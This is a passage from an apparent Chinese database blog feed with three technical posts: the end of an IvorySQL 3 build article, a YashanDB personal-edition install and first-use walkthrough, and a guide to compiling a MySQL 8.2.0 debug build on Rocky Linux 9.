<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[ivorysql@rocky9 ~]$ ss -antpl | grep postgres</span><br><span class="line">LISTEN 0      200        127.0.0.1:5432      0.0.0.0:*    users:((&quot;postgres&quot;,pid=84211,fd=7))</span><br><span class="line">LISTEN 0      200        127.0.0.1:1521      0.0.0.0:*    users:((&quot;postgres&quot;,pid=84211,fd=9))</span><br><span class="line">LISTEN 0      200            [::1]:5432         [::]:*    users:((&quot;postgres&quot;,pid=84211,fd=6))</span><br><span class="line">LISTEN 0      200            [::1]:1521         [::]:*    users:((&quot;postgres&quot;,pid=84211,fd=8))</span><br><span class="line">[ivorysql@rocky9 ~]$ </span><br></pre></td></tr></table></figure></div>
<p>可以更加完整的看到，服务监听了 5432 和 1521 两个端口。</p>
<h2 id="总结">总结</h2>
<p>本文介绍了如何编译 IvorySQL 3 的源码，并提示了一些注意事项。然后介绍了 IvorySQL 3 框架增强功能。</p>
<ul>
<li>添加双 Parser 支持不同的数据库 Parser</li>
<li>添加双端口支持不同的数据库端口号</li>
<li>添加 <code>initdb -m</code>，支持 PG 模式或 Oracle 模式</li>
</ul>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://shawnyan.cn/2023/postgresql/ivorysql-v2.3-feature/">象牙数据库 IvorySQL v2.3 特性浅析</a></li>
<li><a class="link"   href="https://docs.ivorysql.org/" >IvorySQL 文档中心 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<hr>
<!--
https://github.com/IvorySQL/IvorySQL/pull/213/files
IvorySQL:Add initdb -m,support postgres mode or oracle mode #213
-->
<hr>
<p><a class="link"   href="https://www.modb.pro/db/1719316230573203456" >https://www.modb.pro/db/1719316230573203456 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://pgfans.cn/a/2527" >https://pgfans.cn/a/2527 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>IvorySQL</category>
      </categories>
      <tags>
        <tag>oracle</tag>
        <tag>postgresql</tag>
        <tag>ivorysql</tag>
        <tag>highgo</tag>
        <tag>postgresql 16</tag>
      </tags>
  </entry>
  <entry>
    <title>「YashanDB个人版体验」YashanDB 个人版安装初体验</title>
    <url>/2023/yashan/yashandb-install/</url>
    <content><![CDATA[<img  alt="01.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231031-e08be3f8-a9da-453d-b964-762cd31a5fe1.png"
                      referrerpolicy="no-referrer"
                >
<p>从 YCA 第二期结课到现在已经过去三个月，当时学习课程时，并没有提供个人版安装包，只是提供了一个有时效性的远程访问端口，可以使用的功能也很局限，更多是理论上的感知和了解。</p>
<p>现在第四期的 YCA 培训已经开始，并提供了 YashanDB 个人版，可以自行下载、安装、测试，便利了很多。</p>
<h2 id="YashanDB-的安装">YashanDB 的安装</h2>
<h3 id="安装包">安装包</h3>
<p>从 YashanDB 官网找到下载页面: <a class="link"   href="https://download.yashandb.com/download" >https://download.yashandb.com/download <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>这里选择【YashanDB 个人版】，安装包为：<code>Yashandb Personal 23.1 for Linux x86-64</code>。</p>
<img  alt="02.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231031-f56ca3e9-3f28-4e89-aa6c-976b3db60268.png"
                      referrerpolicy="no-referrer"
                >
<p>下载后，解压缩：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 yashan]# ls</span><br><span class="line">yashandb-personal-23.1.1.100-linux-x86_64.tar.gz</span><br><span class="line">[root@rocky9 yashan]# tar zxf yashandb-personal-23.1.1.100-linux-x86_64.tar.gz </span><br><span class="line">[root@rocky9 yashan]# ls</span><br><span class="line">admin  bin  conf  ext  gitmoduleversion.dat  include  java  lib  LICENSE  plug-in  scripts  yashandb-personal-23.1.1.100-linux-x86_64.tar.gz</span><br><span class="line">[root@rocky9 yashan]# du -sh ./* -c</span><br><span class="line">11M   ./admin</span><br><span class="line">62M   ./bin</span><br><span class="line">720K  ./conf</span><br><span class="line">26M   ./ext</span><br><span class="line">12K   ./gitmoduleversion.dat</span><br><span class="line">36K   ./include</span><br><span class="line">8.0K  ./java</span><br><span class="line">602M  ./lib</span><br><span class="line">16K   ./LICENSE</span><br><span class="line">980K  ./plug-in</span><br><span class="line">32K   ./scripts</span><br><span class="line">244M  ./yashandb-personal-23.1.1.100-linux-x86_64.tar.gz</span><br><span class="line">944M  total</span><br><span class="line">[root@rocky9 yashan]# </span><br></pre></td></tr></table></figure></div>
<p>在 scripts 路径下，提供了安装和初始化脚本，</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 yashan]$ ll scripts/</span><br><span class="line">total 32</span><br><span class="line">-rwxrwxr-x. 1 shawnyan shawnyan 3296 Oct 19 15:59 createResourceCgroup.sh</span><br><span class="line">-rwxrwxr-x. 1 shawnyan shawnyan 2934 Oct 19 15:59 initDB.sh</span><br><span class="line">-rwxrwxr-x. 1 shawnyan shawnyan 2104 Oct 19 15:59 initStandby.sh</span><br><span class="line">-rw-rw-r--. 1 shawnyan shawnyan  411 Oct 19 15:59 install.ini</span><br><span class="line">-rwxrwxr-x. 1 shawnyan shawnyan 1412 Oct 19 15:59 install.sh</span><br><span class="line">-rwxrwxr-x. 1 shawnyan shawnyan 1157 Oct 19 15:59 startup.sh</span><br><span class="line">-rwxrwxr-x. 1 shawnyan shawnyan 1157 Oct 19 15:59 stop.sh</span><br><span class="line">-rwxrwxr-x. 1 shawnyan shawnyan  667 Oct 19 15:59 yascheckStart.sh</span><br></pre></td></tr></table></figure></div>
<h3 id="安装、初始化">安装、初始化</h3>
<p>安装的配置文件使用默认的即可，无需修改，需要注意的是，YashanDB 默认监听端口：1688</p>
<p>分别执行安装脚本、初始化脚本：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 yashan]# ./scripts/install.sh </span><br><span class="line">[root@rocky9 yashan]# ./scripts/initDB.sh </span><br><span class="line">process started!</span><br><span class="line">Database open succeed !</span><br></pre></td></tr></table></figure></div>
<p>此时，数据库已经启动，可以看到 1688 端口已经被监听。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 yashan]# ss -antpl | grep 1688</span><br><span class="line">LISTEN 0      4096         0.0.0.0:1688      0.0.0.0:*    users:((&quot;yasdb&quot;,pid=70869,fd=15))</span><br></pre></td></tr></table></figure></div>
<p>注意，<br>
在安装完成后，会在 <code>bashrc</code> 文件末尾增加一行，所以需要导入环境变量。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 yashan]# tail ~/.bashrc -n1</span><br><span class="line">[ -f /root/yashandb/yasdb_home/conf/yasdb.bashrc ] &amp;&amp; source /root/yashandb/yasdb_home/conf/yasdb.bashrc</span><br><span class="line">[root@rocky9 yashan]# source ~/.bashrc</span><br><span class="line">[root@rocky9 yashan]# </span><br></pre></td></tr></table></figure></div>
<p>可以看到这里设置了几个环境变量：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 yashan]# cat /root/yashandb/yasdb_home/conf/yasdb.bashrc</span><br><span class="line">export YASDB_HOME=/root/yashandb/yasdb_home</span><br><span class="line">export YASDB_DATA=/root/yashandb/yasdb_data</span><br><span class="line">export PATH=$YASDB_HOME/bin:$PATH</span><br><span class="line">export LD_LIBRARY_PATH=$YASDB_HOME/lib:$LD_LIBRARY_PATH</span><br><span class="line">[root@rocky9 yashan]# </span><br></pre></td></tr></table></figure></div>
<h3 id="设置-sys-超管用户口令">设置 sys 超管用户口令</h3>
<p>进入 <code>YASDB_HOME</code>，并使用 <code>yaspwd</code> 命令为超管用户设定密码。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 yasdb_home]# yaspwd file=yasdb.pwd</span><br><span class="line">Enter password for SYS:dba1234!</span><br></pre></td></tr></table></figure></div>
<p>这里需要注意的是，默认的密码校验规则较为复杂，密码至少8位，至少包含1个特殊字符，且不能包含用户名。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 yasdb_home]# yaspwd file=yasdb.pwd</span><br><span class="line">Enter password for SYS:sys</span><br><span class="line">YASPW-00002 password complexity failed for SYS user : password must contain at least 8 characters</span><br><span class="line">[root@rocky9 yasdb_home]# yaspwd file=yasdb.pwd</span><br><span class="line">Enter password for SYS:sysdba123</span><br><span class="line">YASPW-00002 password complexity failed for SYS user : password must contain at least 1 special character</span><br><span class="line">[root@rocky9 yasdb_home]# yaspwd file=yasdb.pwd</span><br><span class="line">Enter password for SYS:sysdba123!</span><br><span class="line">YASPW-00002 password complexity failed for SYS user : password must not contain the username</span><br></pre></td></tr></table></figure></div>
<h3 id="登录-YashanDB">登录 YashanDB</h3>
<p>这里为便于测试，直接将 <code>YASDBA</code> 用户组赋予 <code>root</code> 用户。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 ~]# cat /etc/group | grep yas</span><br><span class="line">`YASDBA`:x:1001:yashan,root</span><br><span class="line">yashan:x:1002:</span><br><span class="line">[root@rocky9 ~]#</span><br></pre></td></tr></table></figure></div>
<p>如此便可以免密登录。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 config]# yasql / as sysdba</span><br><span class="line">YashanDB SQL Personal Edition Release 23.1.1.100 x86_64</span><br><span class="line"></span><br><span class="line">Connected to:</span><br><span class="line">YashanDB Server Personal Edition Release 23.1.1.100 x86_64 - X86 64bit Linux</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">SQL&gt; </span></span><br></pre></td></tr></table></figure></div>
<h2 id="基础使用">基础使用</h2>
<p>登录后，查看数据库启动状态，和启动时间：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">select</span> status, startup_time <span class="keyword">from</span> v$instance;</span><br><span class="line"></span><br><span class="line">STATUS        STARTUP_TIME                                                     </span><br><span class="line"><span class="comment">------------- ---------------------------------------------------------------- </span></span><br><span class="line"><span class="keyword">OPEN</span>          <span class="number">2023</span><span class="number">-10</span><span class="number">-31</span> <span class="number">01</span>:<span class="number">12</span>:<span class="number">59.760037</span>                                      </span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> fetched.</span><br></pre></td></tr></table></figure></div>
<p>查看日志文件：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> v$logfile;</span><br><span class="line"></span><br><span class="line">THREAD#           ID NAME                                                               BLOCK_SIZE  BLOCK_COUNT  USED_BLOCKS    SEQUENCE# STATUS    </span><br><span class="line"><span class="comment">------- ------------ ---------------------------------------------------------------- ------------ ------------ ------------ ------------ --------- </span></span><br><span class="line">      <span class="number">1</span>            <span class="number">0</span> <span class="operator">/</span>root<span class="operator">/</span>yashandb<span class="operator">/</span>yasdb_data<span class="operator">/</span>dbfiles<span class="operator">/</span>redo0                                  <span class="number">4096</span>        <span class="number">25600</span>            <span class="number">9</span>            <span class="number">1</span> INACTIVE </span><br><span class="line">      <span class="number">1</span>            <span class="number">1</span> <span class="operator">/</span>root<span class="operator">/</span>yashandb<span class="operator">/</span>yasdb_data<span class="operator">/</span>dbfiles<span class="operator">/</span>redo1                                  <span class="number">4096</span>        <span class="number">25600</span>         <span class="number">5740</span>            <span class="number">2</span> <span class="keyword">CURRENT</span>  </span><br><span class="line">      <span class="number">1</span>            <span class="number">2</span> <span class="operator">/</span>root<span class="operator">/</span>yashandb<span class="operator">/</span>yasdb_data<span class="operator">/</span>dbfiles<span class="operator">/</span>redo2                                  <span class="number">4096</span>        <span class="number">25600</span>            <span class="number">0</span>            <span class="number">0</span> INACTIVE </span><br><span class="line">      <span class="number">1</span>            <span class="number">3</span> <span class="operator">/</span>root<span class="operator">/</span>yashandb<span class="operator">/</span>yasdb_data<span class="operator">/</span>dbfiles<span class="operator">/</span>redo3                                  <span class="number">4096</span>        <span class="number">25600</span>            <span class="number">0</span>            <span class="number">0</span> INACTIVE </span><br><span class="line"></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> fetched.</span><br></pre></td></tr></table></figure></div>
<p>查看 DBA 表：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">distinct</span> owner, tablespace_name <span class="keyword">from</span> dba_tables limit <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">OWNER                                                            TABLESPACE_NAME                                                  </span><br><span class="line"><span class="comment">---------------------------------------------------------------- ---------------------------------------------------------------- </span></span><br><span class="line">SYS                                                              <span class="keyword">SYSTEM</span>                                                          </span><br><span class="line">SYS                                                              SYSAUX                                                          </span><br><span class="line">SYS                                                              TEMP                                                            </span><br><span class="line">MDSYS                                                            <span class="keyword">SYSTEM</span>                                                          </span><br><span class="line"></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> fetched.</span><br></pre></td></tr></table></figure></div>
<h2 id="MySQL-兼容模式">MySQL 兼容模式</h2>
<p>YashanDB 通过 SQL 插件的形式兼容了部分 MySQL 特性，通过下面的命令可以启用 MySQL 兼容模式：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">SYSTEM</span> <span class="keyword">SET</span> SQL_PLUGIN <span class="operator">=</span> <span class="string">&#x27;MYSQL&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Succeed.</span><br></pre></td></tr></table></figure></div>
<p>下面做些简单的测试：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">table</span> t1 (id <span class="type">int</span>);</span><br><span class="line"></span><br><span class="line">Succeed.</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">insert</span> t1 <span class="keyword">select</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>:<span class="number">8</span>]YAS<span class="number">-04115</span> &quot;INTO&quot; expected but missing</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">insert</span> <span class="keyword">into</span> t1 <span class="keyword">select</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">YAS<span class="number">-00004</span> feature &quot;implict table&quot; has <span class="keyword">not</span> been implemented yet</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">insert</span> <span class="keyword">into</span> t1 <span class="keyword">values</span> (<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> affected.</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t1;</span><br><span class="line"></span><br><span class="line">          ID </span><br><span class="line"><span class="comment">------------ </span></span><br><span class="line">           <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> fetched.</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">desc</span> t1;</span><br><span class="line">NAME                                                             <span class="keyword">NULL</span>?     DATATYPE                          </span><br><span class="line"><span class="comment">---------------------------------------------------------------- --------- --------------------------------- </span></span><br><span class="line">ID                                                                         <span class="type">INTEGER</span>                           </span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> t1;</span><br><span class="line">YASQL<span class="number">-00010</span> <span class="literal">unknown</span> <span class="keyword">SHOW</span> option</span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">delete</span> <span class="keyword">from</span> t1 ;</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> affected.</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t1;</span><br><span class="line"></span><br><span class="line">          ID </span><br><span class="line"><span class="comment">------------ </span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span> <span class="keyword">rows</span> fetched.</span><br></pre></td></tr></table></figure></div>
<p>可以看到，这里只是兼容了一些最基础的语法，并不完善，也或许是个人版的功能并不完全。</p>
<h2 id="总结">总结</h2>
<p>YashanDB 是国产数据库的一颗新星，“形”极其似 O 某，希望“神”不仅似，且能超越，最后遥遥领先。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
]]></content>
      <categories>
        <category>YashanDB</category>
      </categories>
      <tags>
        <tag>yashandb</tag>
        <tag>yca认证</tag>
      </tags>
  </entry>
  <entry>
    <title>【MySQL 8.x】在 Rocky 9 上编译 MySQL 8.2.0 Debug 版本编译指南</title>
    <url>/2023/mysql/mysql-8.2.0-compile-on-rocky-9/</url>
    <content><![CDATA[<img  alt="mysql-logo.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231030-e3039511-88f3-4035-82fc-89d0f77a4e52.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="前情提要">前情提要</h2>
<p>前文已经介绍了如何安装 Rocky Linux 9.2，这里便不再赘述。<br>
同时，也已经介绍过 MySQL 8.2.0 的参数变化，以及提及如何安装 MySQL 8.2.0。</p>
<ul>
<li><a href="https://shawnyan.cn/2023/mysql/mysql-8.2.0-sys-vars/">【MySQL 8.2.0】从参数变化解读 MySQL 8.2.0 发版说明</a></li>
<li><a href="https://shawnyan.cn/2023/linux/rocky-9.2-install/">【Rocky 9】Step by Step 安装 Rocky Linux 9.2 系统</a></li>
<li><a href="https://shawnyan.cn/2023/linux/centos-7.9-upgrade-to-rocky-9.2/">【Rocky 9】Step by Step 从 CentOS 7.9 升级到 Rocky Linux 9.2</a></li>
</ul>
<p>本文将着重介绍如何编译 MySQL 8.2.0 Debug 版本。</p>
<h2 id="环境准备">环境准备</h2>
<p>本文使用的操作系统为 Rocky Linux 9.2，下面简称 Rocky。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ cat /etc/redhat-release </span><br><span class="line">Rocky Linux release 9.2 (Blue Onyx)</span><br><span class="line">[shawnyan@rocky9 ~]$ cmake --version</span><br><span class="line">cmake version 3.20.2</span><br><span class="line"></span><br><span class="line">CMake suite maintained and supported by Kitware (kitware.com/cmake).</span><br><span class="line">[shawnyan@rocky9 ~]$ </span><br></pre></td></tr></table></figure></div>
<p>mysql-server 的源码为 cpp 语言，编译需要用到 cmake，这里已经安装好，版本为 3.20.2。</p>
<h2 id="下载源码">下载源码</h2>
<p>mysql-server 的源码，通常有两种下载途径：</p>
<ol>
<li>从 MySQL 官网下载源码包。</li>
</ol>
<p>官网下载地址：<a class="link"   href="https://dev.mysql.com/downloads/mysql/" >https://dev.mysql.com/downloads/mysql/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<img  alt="01-mysql-download-page.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231030-2c961430-ddc8-44aa-9d0e-30d2628b1485.png"
                      referrerpolicy="no-referrer"
                >
<ol start="2">
<li>从 GitHub 上克隆获取。</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/mysql/mysql-server.git</span><br></pre></td></tr></table></figure></div>
<p>源码版本为：<code>mysql-8.2.0, 7307d4</code></p>
<h2 id="编译源码">编译源码</h2>
<p>下载源码后，进入源码路径，创建一个 debug 文件夹，专门用于编译。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir debug</span><br><span class="line">cd debug</span><br></pre></td></tr></table></figure></div>
<p>由于这次是编译 debug 版本，所以需要将构建类型设定为 debug。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cmake .. -DCMAKE_BUILD_TYPE=Debug -DWITH_BOOST=. </span><br><span class="line">make</span><br></pre></td></tr></table></figure></div>
<p>编译的过程是漫长的，这个时间可以去煮杯咖啡，慢慢等待。</p>
<img  alt="02-compile-time.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231031-0f5469e1-0cde-41bd-9125-65997d927034.png"
                      referrerpolicy="no-referrer"
                >
<p>最后，执行 <code>make install</code> 进行安装，这里安装路径选择为默认路径，即 <code>/usr/local/mysql</code>。</p>
<h2 id="运行-MySQL-8-2-0-Debug-服务器">运行 MySQL 8.2.0 Debug 服务器</h2>
<p>安装完成后，需要进行数据库初始化。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/local/mysql/bin/mysqld --initialize-insecure</span><br></pre></td></tr></table></figure></div>
<p>然后启动即可。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[mysql@rocky9 mysql]$ /usr/local/mysql/bin/mysqld</span><br><span class="line">2023-10-30T10:10:05.928804Z 0 [System] [MY-015015] [Server] MySQL Server - start.</span><br><span class="line">2023-10-30T10:10:06.674943Z 0 [System] [MY-010116] [Server] /usr/local/mysql/bin/mysqld (mysqld 8.2.0-debug) starting as process 70140</span><br><span class="line">2023-10-30T10:10:06.734430Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.</span><br><span class="line">2023-10-30T10:10:08.003417Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.</span><br><span class="line">2023-10-30T10:10:09.939694Z 0 [System] [MY-010229] [Server] Starting XA crash recovery...</span><br><span class="line">2023-10-30T10:10:09.945047Z 0 [System] [MY-010232] [Server] XA crash recovery finished.</span><br><span class="line">2023-10-30T10:10:10.141478Z 0 [Warning] [MY-010068] [Server] CA certificate ca.pem is self signed.</span><br><span class="line">2023-10-30T10:10:10.141636Z 0 [System] [MY-013602] [Server] Channel mysql_main configured to support TLS. Encrypted connections are now supported for this channel.</span><br><span class="line">2023-10-30T10:10:10.460188Z 0 [System] [MY-011323] [Server] X Plugin ready for connections. Bind-address: &#x27;::&#x27; port: 33060, socket: /tmp/mysqlx.sock</span><br><span class="line">2023-10-30T10:10:10.461041Z 0 [System] [MY-010931] [Server] /usr/local/mysql/bin/mysqld: ready for connections. Version: &#x27;8.2.0-debug&#x27;  socket: &#x27;/tmp/mysql.sock&#x27;  port: 3306  Source distribution.</span><br><span class="line">2023-10-30T10:10:25Z UTC - mysqld got signal 11 ;</span><br></pre></td></tr></table></figure></div>
<p>这里可以从日志中看到，MySQL 服务器已经启动，版本为：‘8.2.0-debug’。</p>
<img  alt="03-version.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231031-cb9a53d1-cb74-4a93-b7c5-dbeb6a53b304.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="实验：SHOW-PARSE-TREE-新特性">实验：<code>SHOW PARSE_TREE</code> 新特性</h2>
<p>在 <a href="https://shawnyan.cn/2023/mysql/mysql-8.2.0-sys-vars/">【MySQL 8.2.0】从参数变化解读 MySQL 8.2.0 发版说明</a> 中已经介绍过 <code>SHOW PARSE_TREE</code> 新特性，但该特性仅支持 Debug 版本，所以这里可以进行测试。</p>
<p>示例如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> parse_tree <span class="keyword">select</span> <span class="number">1</span>\G</span><br></pre></td></tr></table></figure></div>
<p>输出结果如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> parse_tree <span class="keyword">select</span> <span class="number">1</span>\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Show_parse_tree: &#123;</span><br><span class="line">  &quot;text&quot;: &quot;select 1&quot;,</span><br><span class="line">  &quot;type&quot;: &quot;PT_select_stmt&quot;,</span><br><span class="line">  &quot;components&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;text&quot;: &quot;select 1&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;PT_query_expression&quot;,</span><br><span class="line">      &quot;components&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;text&quot;: &quot;select 1&quot;,</span><br><span class="line">          &quot;type&quot;: &quot;PT_query_specification&quot;,</span><br><span class="line">          &quot;components&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;text&quot;: &quot;1&quot;,</span><br><span class="line">              &quot;type&quot;: &quot;PT_select_item_list&quot;,</span><br><span class="line">              &quot;components&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                  &quot;text&quot;: &quot;1&quot;,</span><br><span class="line">                  &quot;type&quot;: &quot;PTI_expr_with_alias&quot;,</span><br><span class="line">                  &quot;components&quot;: [</span><br><span class="line">                    &#123;</span><br><span class="line">                      &quot;text&quot;: &quot;1&quot;,</span><br><span class="line">                      &quot;type&quot;: &quot;Item_int&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                  ]</span><br><span class="line">                &#125;</span><br><span class="line">              ]</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>不过，这里遇到了一个问题，看来这个新特性有严重的bug：</p>
<ul>
<li><a class="link"   href="https://bugs.mysql.com/bug.php?id=112883" >[Open] Bug #112883 	mysql 8.1.0/8.2.0, mysqld got signal 11, when send sql, show parse_tree <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h2 id="遇到问题">遇到问题</h2>
<h3 id="缺包问题">缺包问题</h3>
<p>编译过程中会提示缺少类包，好在代码已经做了 catch 及 tips，这里只需依照提示安装对应缺少的包即可，比如：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">-- Could NOT find Curses (missing: CURSES_LIBRARY CURSES_INCLUDE_PATH) </span><br><span class="line">CMake Error at cmake/readline.cmake:92 (MESSAGE):</span><br><span class="line">  Curses library not found.  Please install appropriate package,</span><br><span class="line"></span><br><span class="line">      remove CMakeCache.txt and rerun cmake.On Debian/Ubuntu, package name is libncurses5-dev, on Redhat and derivates it is ncurses-devel.</span><br><span class="line">Call Stack (most recent call first):</span><br><span class="line">  cmake/readline.cmake:126 (FIND_CURSES)</span><br><span class="line">  cmake/readline.cmake:220 (MYSQL_USE_BUNDLED_EDITLINE)</span><br><span class="line">  CMakeLists.txt:1934 (MYSQL_CHECK_EDITLINE)</span><br></pre></td></tr></table></figure></div>
